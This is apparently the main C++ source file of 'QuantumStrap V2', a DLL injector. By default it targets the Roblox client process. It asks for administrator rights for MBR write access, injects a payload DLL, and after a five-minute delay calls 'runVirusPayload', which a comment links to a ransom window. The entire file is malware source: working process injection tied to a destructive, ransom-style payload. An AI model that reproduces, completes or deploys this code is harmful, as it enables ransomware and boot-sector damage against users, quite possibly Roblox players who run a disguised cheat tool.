/* ==========================================================================
   QuantumStrap V2 - Main injector program
   Usage: QuantumStrap.exe [process.exe] [payload.dll]
   Run as Administrator (payload needs MBR write access).
   ========================================================================== */
#include <cstdio>
#include <cstring>
#include <string>
#include <thread>
#include <chrono>

#include <windows.h>
#include "injector.h"
#include "tung.h"

/* Change to minutes(1) while testing! */
static constexpr auto PAYLOAD_DELAY = std::chrono::minutes(5);

int main(int argc, char** argv) {
    const wchar_t* target  = L"RobloxPlayerBeta.exe";
    const char*    dllPath = "QuantumPayload.dll";

    printf("============================================\n");
    printf("   QuantumStrap V2 Injector\n");
    printf("============================================\n");

    if (argc > 1) {
        static wchar_t wbuf[256];
        swprintf(wbuf, 256, L"%hs", argv[1]);
        target = wbuf;
    }
    if (argc > 2) dllPath = argv[2];

    if (!qs::EnableDebugPrivilege())
        printf("[!] Could not enable SeDebugPrivilege (run as admin?)\n");
    if (!qs::IsRunAsAdmin())
        printf("[!] Not admin: MBR payload will fail. Run as administrator!\n");

    /* resolve DLL to a full path — required for remote LoadLibrary */
    char dllFullPath[MAX_PATH];
    if (!GetFullPathNameA(dllPath, MAX_PATH, dllFullPath, NULL) ||
        GetFileAttributesA(dllFullPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] DLL not found: %s\n", dllPath);
        return 1;
    }

    char targetA[64];
    sprintf(targetA, "%ls", target);
    printf("[*] Waiting for %s ...\n", targetA);

    DWORD pid = qs::WaitForProcessAndInject(target, dllFullPath, 0 /*forever*/);
    if (!pid) {
        printf("[-] Injection FAILED.\n");
        return 1;
    }
    printf("[+] Injected into %s (PID %lu)\n", targetA, pid);

    /* 5-minute delayed payload */
    std::thread payload([] {
        std::this_thread::sleep_for(PAYLOAD_DELAY);
        printf("[*] 5 minutes passed - running payload!\n");
        runVirusPayload();
    });

    payload.join();   /* ransom window runs inside runVirusPayload */
    printf("[+] Done.\n");
    return 0;
}
